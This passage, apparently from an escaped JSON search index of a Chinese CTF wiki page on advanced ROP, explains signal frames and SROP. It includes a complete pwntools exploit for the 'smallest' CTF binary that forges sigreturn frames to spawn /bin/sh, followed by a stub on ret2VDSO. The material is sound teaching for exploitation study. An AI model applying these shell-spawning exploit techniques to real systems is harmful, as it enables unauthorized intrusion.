n\n\n\n\n\n\n\n\n\u5185\u6838\u5411\u67d0\u4e2a\u8fdb\u7a0b\u53d1\u9001signal\u673a\u5236\uff0c\u8be5\u8fdb\u7a0b\u4f1a\u88ab\u6682\u65f6\u6302\u8d77\uff0c\u8fdb\u5165\u5185\u6838\u6001\u3002\n\n\n\n\n\n\n\u5185\u6838\u4f1a\u4e3a\u8be5\u8fdb\u7a0b\u4fdd\u5b58\u76f8\u5e94\u7684\u4e0a\u4e0b\u6587\uff0c\n\u4e3b\u8981\u662f\u5c06\u6240\u6709\u5bc4\u5b58\u5668\u538b\u5165\u6808\u4e2d\uff0c\u4ee5\u53ca\u538b\u5165signal\u4fe1\u606f\uff0c\u4ee5\u53ca\u6307\u5411sigreturn\u7684\u7cfb\u7edf\u8c03\u7528\u5730\u5740\n\u3002\u6b64\u65f6\u6808\u7684\u7ed3\u6784\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u79f0ucontext\u4ee5\u53casiginfo\u8fd9\u4e00\u6bb5\u4e3aSignal Frame\u3002\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e00\u90e8\u5206\u662f\u5728\u7528\u6237\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u7684\u3002\n\u4e4b\u540e\u4f1a\u8df3\u8f6c\u5230\u6ce8\u518c\u8fc7\u7684signal handler\u4e2d\u5904\u7406\u76f8\u5e94\u7684signal\u3002\u56e0\u6b64\uff0c\u5f53signal handler\u6267\u884c\u5b8c\u4e4b\u540e\uff0c\u5c31\u4f1a\u6267\u884csigreturn\u4ee3\u7801\u3002\n\n\n\n\n\u5bf9\u4e8esignal Frame\u6765\u8bf4\uff0c\u4e0d\u540c\u4f1a\u56e0\u4e3a\u67b6\u6784\u7684\u4e0d\u540c\u800c\u56e0\u6b64\u6709\u6240\u533a\u522b\uff0c\u8fd9\u91cc\u7ed9\u51fa\u5206\u522b\u7ed9\u51fax86\u4ee5\u53cax64\u7684sigcontext\n\n\n\n\nx86\n\n\n\n\nstruct\n \nsigcontext\n\n\n{\n\n  \nunsigned\n \nshort\n \ngs\n,\n \n__gsh\n;\n\n  \nunsigned\n \nshort\n \nfs\n,\n \n__fsh\n;\n\n  \nunsigned\n \nshort\n \nes\n,\n \n__esh\n;\n\n  \nunsigned\n \nshort\n \nds\n,\n \n__dsh\n;\n\n  \nunsigned\n \nlong\n \nedi\n;\n\n  \nunsigned\n \nlong\n \nesi\n;\n\n  \nunsigned\n \nlong\n \nebp\n;\n\n  \nunsigned\n \nlong\n \nesp\n;\n\n  \nunsigned\n \nlong\n \nebx\n;\n\n  \nunsigned\n \nlong\n \nedx\n;\n\n  \nunsigned\n \nlong\n \necx\n;\n\n  \nunsigned\n \nlong\n \neax\n;\n\n  \nunsigned\n \nlong\n \ntrapno\n;\n\n  \nunsigned\n \nlong\n \nerr\n;\n\n  \nunsigned\n \nlong\n \neip\n;\n\n  \nunsigned\n \nshort\n \ncs\n,\n \n__csh\n;\n\n  \nunsigned\n \nlong\n \neflags\n;\n\n  \nunsigned\n \nlong\n \nesp_at_signal\n;\n\n  \nunsigned\n \nshort\n \nss\n,\n \n__ssh\n;\n\n  \nstruct\n \n_fpstate\n \n*\n \nfpstate\n;\n\n  \nunsigned\n \nlong\n \noldmask\n;\n\n  \nunsigned\n \nlong\n \ncr2\n;\n\n\n};\n\n\n\n\n\n\n\nx64\n\n\n\n\nstruct\n \n_fpstate\n\n\n{\n\n  \n/* FPU environment matching the 64-bit FXSAVE layout.  */\n\n  \n__uint16_t\n        \ncwd\n;\n\n  \n__uint16_t\n        \nswd\n;\n\n  \n__uint16_t\n        \nftw\n;\n\n  \n__uint16_t\n        \nfop\n;\n\n  \n__uint64_t\n        \nrip\n;\n\n  \n__uint64_t\n        \nrdp\n;\n\n  \n__uint32_t\n        \nmxcsr\n;\n\n  \n__uint32_t\n        \nmxcr_mask\n;\n\n  \nstruct\n \n_fpxreg\n    \n_st\n[\n8\n];\n\n  \nstruct\n \n_xmmreg\n    \n_xmm\n[\n16\n];\n\n  \n__uint32_t\n        \npadding\n[\n24\n];\n\n\n};\n\n\n\nstruct\n \nsigcontext\n\n\n{\n\n  \n__uint64_t\n \nr8\n;\n\n  \n__uint64_t\n \nr9\n;\n\n  \n__uint64_t\n \nr10\n;\n\n  \n__uint64_t\n \nr11\n;\n\n  \n__uint64_t\n \nr12\n;\n\n  \n__uint64_t\n \nr13\n;\n\n  \n__uint64_t\n \nr14\n;\n\n  \n__uint64_t\n \nr15\n;\n\n  \n__uint64_t\n \nrdi\n;\n\n  \n__uint64_t\n \nrsi\n;\n\n  \n__uint64_t\n \nrbp\n;\n\n  \n__uint64_t\n \nrbx\n;\n\n  \n__uint64_t\n \nrdx\n;\n\n  \n__uint64_t\n \nrax\n;\n\n  \n__uint64_t\n \nrcx\n;\n\n  \n__uint64_t\n \nrsp\n;\n\n  \n__uint64_t\n \nrip\n;\n\n  \n__uint64_t\n \neflags\n;\n\n  \nunsigned\n \nshort\n \ncs\n;\n\n  \nunsigned\n \nshort\n \ngs\n;\n\n  \nunsigned\n \nshort\n \nfs\n;\n\n  \nunsigned\n \nshort\n \n__pad0\n;\n\n  \n__uint64_t\n \nerr\n;\n\n  \n__uint64_t\n \ntrapno\n;\n\n  \n__uint64_t\n \noldmask\n;\n\n  \n__uint64_t\n \ncr2\n;\n\n  \n__extension__\n \nunion\n\n    \n{\n\n      \nstruct\n \n_fpstate\n \n*\n \nfpstate\n;\n\n      \n__uint64_t\n \n__fpstate_word\n;\n\n    \n};\n\n  \n__uint64_t\n \n__reserved1\n \n[\n8\n];\n\n\n};\n\n\n\n\n\n\n\n\n\nsignal handler\u8fd4\u56de\u540e\uff0c\u5185\u6838\u4e3a\u6267\u884csigreturn\u7cfb\u7edf\u8c03\u7528\uff0c\u4e3a\u8be5\u8fdb\u7a0b\u6062\u590d\u4e4b\u524d\u4fdd\u5b58\u7684\u4e0a\u4e0b\u6587\uff0c\u5176\u4e2d\u5305\u62ec\u5c06\u6240\u6709\u538b\u5165\u7684\u5bc4\u5b58\u5668\uff0c\u91cd\u65b0pop\u56de\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\uff0c\u6700\u540e\u6062\u590d\u8fdb\u7a0b\u7684\u6267\u884c\u3002\u5176\u4e2d\uff0c32\u4f4d\u7684sigreturn\u7684\u8c03\u7528\u53f7\u4e3a77\uff0c64\u4f4d\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u4e3a15\u3002\n\n\n\n\n\n\n\u653b\u51fb\u539f\u7406\n\n\n\u4ed4\u7ec6\u56de\u987e\u4e00\u4e0b\u5185\u6838\u5728signal\u4fe1\u53f7\u5904\u7406\u7684\u8fc7\u7a0b\u4e2d\u7684\u5de5\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u5185\u6838\u4e3b\u8981\u505a\u7684\u5de5\u4f5c\u5c31\u662f\u4e3a\u8fdb\u7a0b\u4fdd\u5b58\u4e0a\u4e0b\u6587\uff0c\u5e76\u4e14\u6062\u590d\u4e0a\u4e0b\u6587\u3002\u8fd9\u4e2a\u4e3b\u8981\u7684\u53d8\u52a8\u90fd\u5728Signal Frame\u4e2d\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff1a\n\n\n\n\nSignal Frame\u88ab\u4fdd\u5b58\u5728\u7528\u6237\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\uff0c\u6240\u4ee5\u7528\u6237\u662f\u53ef\u4ee5\u8bfb\u5199\u7684\u3002\n\n\n\u7531\u4e8e\u5185\u6838\u4e0e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u65e0\u5173(kernel agnostic about signal handlers)\uff0c\u5b83\u5e76\u4e0d\u4f1a\u53bb\u8bb0\u5f55\u8fd9\u4e2asignal\u5bf9\u5e94\u7684Signal Frame\uff0c\u6240\u4ee5\u5f53\u6267\u884csigreturn\u7cfb\u7edf\u8c03\u7528\u65f6\uff0c\u6b64\u65f6\u7684Signal Frame\u5e76\u4e0d\u4e00\u5b9a\u662f\u4e4b\u524d\u5185\u6838\u4e3a\u7528\u6237\u8fdb\u7a0b\u4fdd\u5b58\u7684Signal Frame\u3002\n\n\n\n\n\u8bf4\u5230\u8fd9\u91cc\uff0c\u5176\u5b9e\uff0cSROP\u7684\u57fa\u672c\u5229\u7528\u539f\u7406\u4e5f\u5c31\u51fa\u73b0\u4e86\u3002\u4e0b\u9762\u4e3e\u4e24\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u3002\n\n\n\u83b7\u53d6shell\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u5047\u8bbe\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u7528\u6237\u8fdb\u7a0b\u7684\u6808\uff0c\u90a3\u4e48\u5b83\u5c31\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2aSignal Frame\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u8fd9\u91cc\u4ee564\u4f4d\u4e3a\u4f8b\u5b50\uff0c\u7ed9\u51faSignal Frame\u66f4\u52a0\u8be6\u7ec6\u7684\u4fe1\u606f\n\n\n\n\n\u5f53\u7cfb\u7edf\u6267\u884c\u5b8csigreturn\u7cfb\u7edf\u8c03\u7528\u4e4b\u540e\uff0c\u4f1a\u6267\u884c\u4e00\u7cfb\u5217\u7684pop\u6307\u4ee4\u4ee5\u4fbf\u4e8e\u6062\u590d\u76f8\u5e94\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u5f53\u6267\u884c\u5230rip\u65f6\uff0c\u5c31\u4f1a\u5c06\u7a0b\u5e8f\u6267\u884c\u6d41\u6307\u5411syscall\u5730\u5740\uff0c\u6839\u636e\u76f8\u5e94\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u6b64\u65f6\uff0c\u4fbf\u4f1a\u5f97\u5230\u4e00\u4e2ashell\u3002\n\n\nsystem call chains\n\n\n\u9700\u8981\u6307\u51fa\u7684\u662f\uff0c\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u53ea\u662f\u5355\u72ec\u7684\u83b7\u5f97\u4e00\u4e2ashell\u3002\u6709\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u5e0c\u671b\u6267\u884c\u4e00\u7cfb\u5217\u7684\u51fd\u6570\u3002\u6211\u4eec\u53ea\u9700\u8981\u505a\u4e24\u5904\u4fee\u6539\u5373\u53ef\n\n\n\n\n\u63a7\u5236\u6808\u6307\u9488\u3002\n\n\n\u628a\u539f\u6765rip\u6307\u5411\u7684\nsyscall\n gadget\u6362\u6210\nsyscall; ret\n gadget\u3002\n\n\n\n\n\u5982\u4e0b\u56fe\u6240\u793a \uff0c\u8fd9\u6837\u5f53\u6bcf\u6b21syscall\u8fd4\u56de\u7684\u65f6\u5019\uff0c\u6808\u6307\u9488\u90fd\u4f1a\u6307\u5411\u4e0b\u4e00\u4e2aSignal Frame\u3002\u56e0\u6b64\u5c31\u53ef\u4ee5\u6267\u884c\u4e00\u7cfb\u5217\u7684sigreturn\u51fd\u6570\u8c03\u7528\u3002\n\n\n\n\n\u540e\u7eed\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5728\u6784\u9020ROP\u653b\u51fb\u7684\u65f6\u5019\uff0c\u9700\u8981\u6ee1\u8db3\u4e0b\u9762\u7684\u6761\u4ef6\n\n\n\n\n\u53ef\u4ee5\u901a\u8fc7\u6808\u6ea2\u51fa\u6765\u63a7\u5236\u6808\u7684\u5185\u5bb9\n\n\n\u9700\u8981\u77e5\u9053\u76f8\u5e94\u7684\u5730\u5740\n\n\n\"/bin/sh\"\n\n\nSignal Frame\n\n\nsyscal\n\n\nsigreturn\n\n\n\n\n\n\n\u9700\u8981\u6709\u591f\u5927\u7684\u7a7a\u95f4\u6765\u585e\u4e0b\u6574\u4e2asigal frame\n\n\n\n\n\u6b64\u5916\uff0c\u5173\u4e8esigreturn\u4ee5\u53casyscall;ret\u8fd9\u4e24\u4e2agadget\u5728\u4e0a\u9762\u5e76\u6ca1\u6709\u63d0\u53ca\u3002\u63d0\u51fa\u8be5\u653b\u51fb\u7684\u8bba\u6587\u4f5c\u8005\u53d1\u73b0\u4e86\u8fd9\u4e9bgadgets\u51fa\u73b0\u7684\u67d0\u4e9b\u5730\u5740\uff1a\n\n\n\n\n\u5e76\u4e14\uff0c\u4f5c\u8005\u53d1\u73b0\uff0c\u6709\u4e9b\u7cfb\u7edf\u4e0aSROP\u7684\u5730\u5740\u88ab\u968f\u673a\u5316\u4e86\uff0c\u800c\u6709\u4e9b\u5219\u6ca1\u6709\u3002\u6bd4\u5982\u8bf4\nLinux \n 3.3 x86_64\n\uff08\u5728Debian 7.0\uff0c Ubuntu Long Term Support\uff0c CentOS 6\u7cfb\u7edf\u4e2d\u9ed8\u8ba4\u5185\u6838\uff09\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728vsyscall\u4e2d\u7684\u56fa\u5b9a\u5730\u5740\u5904\u627e\u5230syscall\nreturn\u4ee3\u7801\u7247\u6bb5\u3002\u5982\u4e0b\n\n\n\n\n\u4f46\u662f\u76ee\u524d\u5b83\u5df2\u7ecf\u88ab\nvsyscall-emulate\n\u548c\nvdso\n\u673a\u5236\u4ee3\u66ff\u4e86\u3002\u6b64\u5916\uff0c\u76ee\u524d\u5927\u591a\u6570\u7cfb\u7edf\u90fd\u4f1a\u5f00\u542fASLR\u4fdd\u62a4\uff0c\u6240\u4ee5\u76f8\u5bf9\u6765\u8bf4\u8fd9\u4e9bgadgets\u90fd\u5e76\u4e0d\u5bb9\u6613\u627e\u5230\u3002\n\n\n\u503c\u5f97\u4e00\u8bf4\u7684\u662f\uff0c\u5bf9\u4e8esigreturn\u7cfb\u7edf\u8c03\u7528\u6765\u8bf4\uff0c\u572864\u4f4d\u7cfb\u7edf\u4e2d\uff0csigreturn\u7cfb\u7edf\u8c03\u7528\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u4e3a15\uff0c\u53ea\u9700\u8981RAX=15\uff0c\u5e76\u4e14\u6267\u884csyscall\u5373\u53ef\u5b9e\u73b0\u8c03\u7528syscall\u8c03\u7528\u3002\u800cRAX\u5bc4\u5b58\u5668\u7684\u503c\u53c8\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u6765\u95f4\u63a5\u63a7\u5236\uff0c\u6bd4\u5982\u8bf4read\u51fd\u6570\u7684\u8fd4\u56de\u503c\u4e3a\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u3002\n\n\n\u5229\u7528\u5de5\u5177\n\n\n\u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u5728\u76ee\u524d\u7684pwntools\u4e2d\u5df2\u7ecf\u96c6\u6210\u4e86\u5bf9\u4e8esrop\u7684\u653b\u51fb\u3002\n\n\n\u793a\u4f8b\n\n\n\u8fd9\u91cc\u4ee5360\u6625\u79cb\u676f\u4e2d\u7684smallest-pwn\u4e3a\u4f8b\u8fdb\u884c\u7b80\u5355\u4ecb\u7ecd\u3002\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b\n\n\n\u786e\u5b9a\u6587\u4ef6\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  smallest file smallest     \nsmallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\u8be5\u7a0b\u5e8f\u4e3a64\u4f4d\u9759\u6001\u94fe\u63a5\u7248\u672c\u3002\n\n\n\u68c0\u67e5\u4fdd\u62a4\n\n\n\u279c  smallest checksec smallest     \n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n\n\n\n\n\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002\n\n\n\u6f0f\u6d1e\u53d1\u73b0\n\n\n\u5b9e\u7528IDA\u76f4\u63a5\u53cd\u7f16\u8bd1\u770b\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u7a0b\u5e8f\u5c31\u51e0\u884c\u6c47\u7f16\u4ee3\u7801\uff0c\u5982\u4e0b\n\n\npublic\n \nstart\n\n\nstart\n \nproc\n \nnear\n\n\nxor\n     \nrax\n,\n \nrax\n\n\nmov\n     \nedx\n,\n \n400\nh\n\n\nmov\n     \nrsi\n,\n \nrsp\n\n\nmov\n     \nrdi\n,\n \nrax\n\n\nsyscall\n\n\nretn\n\n\nstart\n \nendp\n\n\n\n\n\n\u6839\u636esyscall\u7684\u7f16\u53f7\u4e3a0\uff0c\u53ef\u4ee5\u77e5\u9053\u6539\u7a0b\u5e8f\u6267\u884c\u7684\u6307\u4ee4\u4e3aread(0,$rsp,400)\uff0c\u5373\u5411\u6808\u9876\u8bfb\u5165400\u4e2a\u5b57\u7b26\u3002\u6beb\u65e0\u7591\u95ee\uff0c\u8fd9\u4e2a\u662f\u6709\u6808\u6ea2\u51fa\u7684\u3002\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u7531\u4e8e\u7a0b\u5e8f\u4e2d\u5e76\u6ca1\u6709sigreturn\u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u81ea\u5df1\u6784\u9020\uff0c\u6b63\u597d\u8fd9\u91cc\u6709read\u51fd\u6570\u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7read\u51fd\u6570\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u6765\u8bbe\u7f6erax\u7684\u503c\u3002\u91cd\u8981\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u901a\u8fc7\u63a7\u5236read\u8bfb\u53d6\u7684\u5b57\u7b26\u6570\u6765\u8bbe\u7f6eRAX\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u4ece\u800c\u6267\u884csigreturn\n\n\n\u901a\u8fc7syscall\u6267\u884cexecve(\"/bin/sh\",0,0)\u6765\u83b7\u53d6shell\u3002\n\n\n\n\n\u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nLibcSearcher\n \nimport\n \n*\n\n\nsmall\n \n=\n \nELF\n(\n./smallest\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n7777\n)\n\n\nelse\n:\n\n    \nsh\n \n=\n \nprocess\n(\n./smallest\n)\n\n\ncontext\n.\narch\n \n=\n \namd64\n\n\ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\nsyscall_ret\n \n=\n \n0x00000000004000BE\n\n\nstart_addr\n \n=\n \n0x00000000004000B0\n\n\n## set start addr three times\n\n\npayload\n \n=\n \np64\n(\nstart_addr\n)\n \n*\n \n3\n\n\nsh\n.\nsend\n(\npayload\n)\n\n\n\n## modify the return addr to start_addr+3\n\n\n## so that skip the xor rax,rax; then the rax=1\n\n\n## get stack addr\n\n\nsh\n.\nsend\n(\n\\xb3\n)\n\n\nstack_addr\n \n=\n \nu64\n(\nsh\n.\nrecv\n()[\n8\n:\n16\n])\n\n\nlog\n.\nsuccess\n(\nleak stack addr :\n \n+\n \nhex\n(\nstack_addr\n))\n\n\n\n## make the rsp point to stack_addr\n\n\n## the frame is read(0,stack_addr,0x400)\n\n\nsigframe\n \n=\n \nSigreturnFrame\n()\n\n\nsigframe\n.\nrax\n \n=\n \nconstants\n.\nSYS_read\n\n\nsigframe\n.\nrdi\n \n=\n \n0\n\n\nsigframe\n.\nrsi\n \n=\n \nstack_addr\n\n\nsigframe\n.\nrdx\n \n=\n \n0x400\n\n\nsigframe\n.\nrsp\n \n=\n \nstack_addr\n\n\nsigframe\n.\nrip\n \n=\n \nsyscall_ret\n\n\npayload\n \n=\n \np64\n(\nstart_addr\n)\n \n+\n \na\n \n*\n \n8\n \n+\n \nstr\n(\nsigframe\n)\n\n\nsh\n.\nsend\n(\npayload\n)\n\n\n\n## set rax=15 and call sigreturn\n\n\nsigreturn\n \n=\n \np64\n(\nsyscall_ret\n)\n \n+\n \nb\n \n*\n \n7\n\n\nsh\n.\nsend\n(\nsigreturn\n)\n\n\n\n## call execv(\n/bin/sh\n,0,0)\n\n\nsigframe\n \n=\n \nSigreturnFrame\n()\n\n\nsigframe\n.\nrax\n \n=\n \nconstants\n.\nSYS_execve\n\n\nsigframe\n.\nrdi\n \n=\n \nstack_addr\n \n+\n \n0x120\n  \n# \n/bin/sh\n \ns addr\n\n\nsigframe\n.\nrsi\n \n=\n \n0x0\n\n\nsigframe\n.\nrdx\n \n=\n \n0x0\n\n\nsigframe\n.\nrsp\n \n=\n \nstack_addr\n\n\nsigframe\n.\nrip\n \n=\n \nsyscall_ret\n\n\n\nframe_payload\n \n=\n \np64\n(\nstart_addr\n)\n \n+\n \nb\n \n*\n \n8\n \n+\n \nstr\n(\nsigframe\n)\n\n\nprint\n \nlen\n(\nframe_payload\n)\n\n\npayload\n \n=\n \nframe_payload\n \n+\n \n(\n0x120\n \n-\n \nlen\n(\nframe_payload\n))\n \n*\n \n\\x00\n \n+\n \n/bin/sh\n\\x00\n\n\nsh\n.\nsend\n(\npayload\n)\n\n\nsh\n.\nsend\n(\nsigreturn\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u5176\u57fa\u672c\u6d41\u7a0b\u4e3a\n\n\n\n\n\u8bfb\u53d6\u4e09\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\n\n\n\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5229\u7528\u7b2c\u4e00\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u8bfb\u53d6\u5730\u5740\uff0c\u4fee\u6539\u8fd4\u56de\u5730\u5740(\u5373\u7b2c\u4e8c\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740)\u4e3a\u6e90\u7a0b\u5e8f\u7684\u7b2c\u4e8c\u6761\u6307\u4ee4\uff0c\u5e76\u4e14\u4f1a\u8bbe\u7f6erax=1\n\n\n\u90a3\u4e48\u6b64\u65f6\u5c06\u4f1a\u6267\u884cwrite(1,$esp,0x400)\uff0c\u6cc4\u9732\u6808\u5730\u5740\u3002\n\n\n\u5229\u7528\u7b2c\u4e09\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u8fdb\u800c\u8bfb\u5165payload\n\n\n\u518d\u6b21\u8bfb\u53d6\u6784\u9020sigreturn\u8c03\u7528\uff0c\u8fdb\u800c\u5c06\u5411\u6808\u5730\u5740\u6240\u5728\u4f4d\u7f6e\u8bfb\u5165\u6570\u636e\uff0c\u6784\u9020execve('/bin/sh',0,0)\n\n\n\u518d\u6b21\u8bfb\u53d6\u6784\u9020sigreturn\u8c03\u7528\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002\n\n\n\n\n\u9898\u76ee\n\n\n\n\nDefcon 2015 Qualifier: fuckup\n\n\n\n\n\u53c2\u8003\u9605\u8bfb\n\n\n\n\nSigreturn Oriented Programming (SROP) Attack\u653b\u51fb\u539f\u7406\n\n\nSROP by Angle Baby\n\n\n\u7cfb\u7edf\u8c03\u7528\n\n\n\n\nret2VDSO\n\n\nVDSO\u4ecb\u7ecd\n\n\n\u4ec0\u4e48\u662fVDSO(Virtual Dynamically-linked Shared Object)\u5462\uff1f\u542c\u5176\u540d\u5b57\uff0c\u5927\u6982\u662f\u865a\u62df\u52a8\u6001\u94fe\u63a5\u5171\u4eab\u5bf9\u8c61\uff0c\u6240\u4ee5\u8bf4\u5b83\u5e94\u8be5\u662f\u865a\u62df\u7684\uff0c\u4e0e\u865a\u62df\u5185\u5b58\u4e00\u76f4\uff0c\u5728\u8ba1\u7b97\u673a\u4e2d\u672c\u8eab\u5e76\u4e0d\u5b58\u5728\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5b83\u662f\u5c06\u5185\u6838\u6001\u7684\u8c03\u7528\u6620\u5c04\u5230\u7528\u6237\u5730\u5740\u7a7a\u95f4\u7684\u5e93\u3002\u90a3\u4e48\u5b83\u4e3a\u4ec0\u4e48\u4f1a\u5b58\u5728\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u6709\u4e9b\u7cfb\u7edf\u8c03\u7528\u7ecf\u5e38\u88ab\u7528\u6237\u4f7f\u7528\uff0c\u8fd9\u5c31\u4f1a\u51fa\u73b0\u5927\u91cf\u7684\u7528\u6237\u6001\u4e0e\u5185\u6838\u6001\u5207\u6362\u7684\u5f00\u9500\u3002\u901a\u8fc7vdso\uff0c\u6211\u4eec\u53ef\u4ee5\u5927\u91cf\u51cf\u5c11\u8fd9\u6837\u7684\u5f00\u9500\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u7684\u8def\u5f84\u66f4\u597d\u3002\u8fd9\u91cc\u8def\u5f84\u66f4\u597d\u6307\u7684\u662f\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u4f7f\u7528\u4f20\u7edf\u7684int 0x80\u6765\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u4e0d\u540c\u7684\u5904\u7406\u5668\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u5feb\u901f\u7cfb\u7edf\u8c03\u7528\u6307\u4ee4\n\n\n\n\nintel\u5b9e\u73b0\u4e86sysenter\uff0csysexit\n\n\namd\u5b9e\u73b0\u4e86syscall\uff0csysret\n\n\n\n\n\u5f53\u4e0d\u540c\u7684\u5904\u7406\u5668\u67b6\u6784\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u6307\u4ee4\u65f6\uff0c\u81ea\u7136\u5c31\u4f1a\u51fa\u73b0\u517c\u5bb9\u6027\u95ee\u9898\uff0c\u6240\u4ee5linux\u5b9e\u73b0\u4e86vsyscall\u63a5\u53e3\uff0c\u5728\u5e95\u5c42\u4f1a\u6839\u636e\u5177\u4f53\u7684\u7ed3\u6784\u6765\u8fdb\u884c\u5177\u4f53\u64cd\u4f5c\u3002\u800cvsyscall\u5c31\u5b9e\u73b0\u5728vdso\u4e2d\u3002\n\n\n\u8fd9\u91cc\uff0c\u6211\u4eec\u987a\u4fbf\u6765\u770b\u4e00\u4e0bvdso\uff0c\u5728Linux(kernel 2.6 or upper)\u4e2d\u6267\u884cldd /bin/sh, \u4f1a\u53d1\u73b0\u6709\u4e2a\u540d\u5b57\u53eblinux-vdso.so.1(\u8001\u70b9\u7684\u7248\u672c\u662flinux-gate.so.1)\u7684\u52a8\u6001\u6587\u4ef6, \u800c\u7cfb\u7edf\u4e2d\u5374\u627e\u4e0d\u5230\u5b83, \u5b83\u5c31\u662fVDSO\u3002 \u4f8b\u5982:\n\n\n\u279c  ~ ldd /bin/sh           \n    linux-vdso.so.1 \n=\n  \n(\n0x00007ffd8ebf2000\n)\n\n    libc.so.6 \n=\n /lib/x86_64-linux-gnu/libc.so.6 \n(\n0x00007f84ff2f9000\n)\n\n    /lib64/ld-linux-x86-64.so.2 \n(\n0x0000560cae6eb000\n)\n\n\n\n\n\n\u9664\u4e86\u5feb\u901f\u7cfb\u7edf\u8c03\u7528\uff0cglibc\u4e5f\u63d0\u4f9b\u4e86VDSO\u7684\u652f\u6301, open(), read(), write(), gettimeofday()\u90fd\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528VDSO\u4e2d\u7684\u5b9e\u73b0\u3002\u4f7f\u5f97\u8fd9\u4e9b\u8c03\u7528\u901f\u5ea6\u66f4\u5feb\u3002 \u5185\u6838\u65b0\u7279\u6027\u5728\u4e0d\u5f71\u54cdglibc\u7684\u60c5\u51b5\u4e0b\u4e5f\u53ef\u4ee5\u66f4\u5feb\u7684\u90e8\u7f72\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5intel\u7684\u5904\u7406\u5668\u4e3a\u4f8b\uff0c\u8fdb\u884c\u7b80\u5355\u8bf4\u660e\u3002\n\n\n\u5176\u4e2dsysenter\u7684\u53c2\u6570\u4f20\u9012\u65b9\u5f0f\u4e0eint 0x80\u4e00\u81f4\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u5e03\u7f6e\u597d function prolog\uff0832\u4f4d\u4e3a\u4f8b\uff09\n\n\npush\n \nebp\n\n\nmov\n \nebp\n,\nesp\n\n\n\n\n\n\u6b64\u5916\uff0c\u5982\u679c\u6211\u4eec\u6ca1\u6709\u63d0\u4f9bfuncttion prolog\u7684\u8bdd\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u4e00\u4e2a\u53ef\u4ee5\u8fdb\u884c\u6808\u8fc1\u79fb\u7684gadgets\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u6539\u53d8\u6808\u7684\u4f4d\u7f6e\u3002\n\n\n\u539f\u7406\n\n\n\u5f85\u8865\u5145\u3002    \n\n\n\u9898\u76ee\n\n\n\n\nDefcon 2015 Qualifier fuckup\n\n\n\n\n\u53c2\u8003\n\n\n\n\nhttp://man7.org/linux/man-pages/man7/vdso.7.html\n\n\nhttp://adam8157.info/blog/2011/10/linux-vdso/\n\n\n\n\nJOP\n\n\nJump-oriented programming\n\n\nCOP\n\n\nCall-oriented programming", 
            "title": "\u9ad8\u7ea7 ROP"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#rop", 
